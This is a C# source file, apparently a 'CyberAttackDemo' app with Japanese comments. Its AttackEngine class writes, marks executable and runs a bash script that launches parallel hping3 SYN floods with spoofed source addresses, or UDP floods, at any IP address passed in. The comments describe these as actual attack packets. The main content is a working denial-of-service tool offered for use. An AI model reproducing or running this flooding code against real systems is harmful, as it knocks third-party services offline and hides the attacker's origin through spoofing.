using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        public event Action<string>? OnLogReceived;
        
        // 攻撃スクリプトのパス
        public const string AttackScriptName = @"./Attack/attack.sh";

        // コマンド実行メソッド
        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                // ログ出力のハンドリング
                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    if (timeoutSeconds > 0)
                    {
                        // タイムアウト設定がある場合
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
                        try
                        {
                            await process.WaitForExitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill...");
                            try
                            {
                                // プロセスツリーごと強制終了
                                process.Kill(true);
                            }
                            catch (Exception kex)
                            {
                                OnLogReceived?.Invoke($"[ERROR] Failed to kill process: {kex.Message}");
                            }
                        }
                    }
                    else
                    {
                        await process.WaitForExitAsync();
                    }
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Execution Failed: {ex.Message}");
            }
        }

        // スクリプト生成メソッド
        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                // 常に最新の内容で上書きする（設定変更を反映させるため）
                {
                    string scriptContent = @"#!/bin/bash

# root権限チェック
if [ ""$EUID"" -ne 0 ]; then
  echo ""エラー: root権限で実行してください。""
  exit 1
fi

# C#アプリからの引数を受け取る ($1: IP, $2: 時間, $3: モード)
TARGET_IP=${1:-""127.0.0.1""}
DURATION=${2:-""15""}
MODE_ARG=${3:-""dos""}

# 固定設定
PORT=80
THREADS=4

# 終了時のクリーンアップ関数
cleanup() {
    echo """"
    echo ""[!] 停止シグナルを受信しました。攻撃プロセスを停止中...""
    # このスクリプトの子プロセスとして動いているhping3を全てキル
    pkill -P $$ hping3
    echo ""[*] 完了。""
    exit
}

# Trap設定: SIGINT(Ctrl+C), SIGTERM, EXIT をキャッチ
trap cleanup SIGINT SIGTERM EXIT

echo ""==========================================""
echo ""   Hping3 Actual Stress Tester""
echo ""==========================================""
echo ""[*] TARGET: $TARGET_IP""
echo ""[*] DURATION: $DURATION sec""
echo ""[*] MODE: $MODE_ARG""
echo ""------------------------------------------""

# モード判定
if [ ""$MODE_ARG"" = ""dos"" ]; then
    ATTACK_TYPE=1 # TCP SYN Flood (Actual)
else
    ATTACK_TYPE=2 # UDP Flood (Actual)
fi

echo ""[*] $THREADS 個のプロセスで実際の攻撃パケット送信を開始します。""
echo ""------------------------------------------""

# 並列実行ループ
for (( i=1; i<=THREADS; i++ ))
do
    if [ ""$ATTACK_TYPE"" -eq 1 ]; then
        # Actual SYN Flood
        echo ""Process $i: SYN Flood Started (hping3 -S)""
        # --flood: パケットを可能な限り高速に送信
        # --rand-source: 送信元IPを偽装
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
    else
        # Actual UDP Flood
        echo ""Process $i: UDP Flood Started (hping3 --udp)""
        # -d 1200: データサイズ1200バイト
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    fi
done

# 親プロセスは待機 (C#側からkillされるか、ユーザーが止めるまで)
wait
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    
                    // 実行権限を付与
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    
                    OnLogReceived?.Invoke($"[SYSTEM] Updated attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}
